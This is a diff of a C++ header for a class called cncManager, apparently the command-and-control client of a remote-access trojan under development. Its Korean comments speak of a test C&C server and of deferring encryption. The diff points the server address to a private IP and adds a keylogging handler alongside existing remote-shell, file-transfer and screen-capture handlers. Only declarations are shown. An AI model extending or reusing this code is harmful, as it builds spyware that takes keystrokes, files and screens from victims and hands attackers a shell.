@@ -12,7 +12,7 @@ class cncManager
 private:
 	LPCWSTR
 		/* 일단 C&C 정해지기 전이라 테스트용*/
-		server = L"127.0.0.1",
+		server = L"172.17.242.56",
 		index = L"/tests";
 
 
@@ -31,6 +31,7 @@ public:
 	void handleShellRequest();
 	void handleFtpRequest(std::string path);
 	void handleScreenRequest();
+	void handleKeyLog();
 	/* 암호화는 디버깅 편의를 위해서 마지막에 구현하는걸로 */
 	LPVOID dataEncrypt(LPVOID data);
 	LPVOID dataDecrypt(LPVOID data);
